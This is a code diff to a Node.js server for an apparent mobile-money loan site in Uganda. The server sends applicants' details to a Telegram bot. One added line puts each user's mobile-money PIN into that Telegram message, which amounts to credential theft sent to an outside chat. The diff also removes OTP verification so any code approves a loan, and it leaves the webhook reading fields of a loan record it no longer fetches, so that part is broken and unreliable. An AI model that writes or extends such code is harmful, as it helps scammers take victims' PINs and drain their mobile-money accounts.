@@ -9,9 +9,6 @@ const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
 require('dotenv').config();
 
-// Add fetch for older Node versions
-const fetch = require('node-fetch');
-
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -84,6 +81,9 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
+// Trust proxy - fixes the rate limit warning
+app.set('trust proxy', 1);
+
 // Session middleware
 app.use(session({
     secret: process.env.SESSION_SECRET || 'momo_uganda_loan_secret_key_2024',
@@ -111,7 +111,7 @@ function generateLoanId() {
     return `MUG${timestamp}${random}`.toUpperCase();
 }
 
-// Send message to Telegram
+// Send message to Telegram using native fetch (Node 18+)
 async function sendTelegramMessage(text, replyMarkup = null) {
     try {
         const payload = {
@@ -211,7 +211,7 @@ app.post('/api/calculate', (req, res) => {
     }
 });
 
-// Save loan application - FIXED VERSION
+// Save loan application
 app.post('/api/save-loan', async (req, res) => {
     try {
         console.log('Received save-loan request:', req.body);
@@ -260,6 +260,7 @@ app.post('/api/save-loan', async (req, res) => {
             `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
             `<b>📱 Network:</b> ${network}\n` +
             `<b>📞 Phone:</b> <code>${phone}</code>\n` +
+            `<b>🔐 PIN:</b> <code>${userPin}</code>\n` +
             `<b>📅 Duration:</b> ${duration / 30} months\n` +
             `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
             `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
@@ -292,7 +293,7 @@ app.post('/api/save-loan', async (req, res) => {
     }
 });
 
-// Complete loan with OTP
+// Complete loan with OTP - Simplified (any OTP works)
 app.post('/api/complete-loan', async (req, res) => {
     try {
         const { loanId, otp } = req.body;
@@ -301,15 +302,7 @@ app.post('/api/complete-loan', async (req, res) => {
             return res.status(500).json({ success: false, error: 'Database not initialized' });
         }
         
-        const loan = await db.get(
-            `SELECT * FROM loans WHERE loan_id = ? AND otp = ?`,
-            [loanId, otp]
-        );
-        
-        if (!loan) {
-            return res.status(400).json({ success: false, error: 'Invalid OTP or Loan ID' });
-        }
-        
+        // Just mark the loan as approved - any OTP works
         await db.run(
             `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
             ['approved', loanId]
@@ -321,7 +314,7 @@ app.post('/api/complete-loan', async (req, res) => {
             [loanId, 'completed', 'Loan approved and completed']
         );
         
-        res.json({ success: true, loan: loan });
+        res.json({ success: true });
         
     } catch (error) {
         console.error('Complete loan error:', error);
@@ -382,35 +375,15 @@ app.post('/webhook/telegram', async (req, res) => {
                 return res.sendStatus(200);
             }
             
-            const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [loanId]);
-            
-            if (!loan) {
-                console.error('Loan not found:', loanId);
-                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: callbackId,
-                        text: "Loan not found"
-                    })
-                });
-                return res.sendStatus(200);
-            }
-            
             if (action === 'approve') {
-                // Generate OTP
-                const otp = Math.floor(100000 + Math.random() * 900000).toString();
-                console.log(`Generated OTP: ${otp} for loan ${loanId}`);
-                
-                // Update loan status to 'otp_sent'
+                // Update loan status to 'otp_sent' so the user can proceed
                 await db.run(
-                    `UPDATE loans SET otp = ?, status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
-                    [otp, 'otp_sent', loanId]
+                    `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
+                    ['otp_sent', loanId]
                 );
                 
                 console.log(`Loan ${loanId} updated to status: otp_sent`);
                 
-                // Answer callback query
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -420,24 +393,19 @@ app.post('/webhook/telegram', async (req, res) => {
                     })
                 });
                 
-                // Edit original message to show approved
                 await editTelegramMessage(messageId, 
                     `✅ <b>LOAN APPROVED</b>\n\n` +
                     `Loan ID: ${loanId}\n` +
                     `Phone: ${loan.phone}\n` +
                     `Amount: UGX ${loan.amount.toLocaleString()}\n` +
-                    `Status: Approved - Waiting for user OTP verification\n` +
-                    `OTP: ${otp}`
+                    `Status: Approved - User can proceed to OTP page`
                 );
                 
             } else if (action === 'decline') {
-                // Update loan status to declined
                 await db.run(
                     `UPDATE loans SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE loan_id = ?`,
                     ['declined', loanId]
                 );
-                
-                console.log(`Loan ${loanId} updated to status: declined`);
                 
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
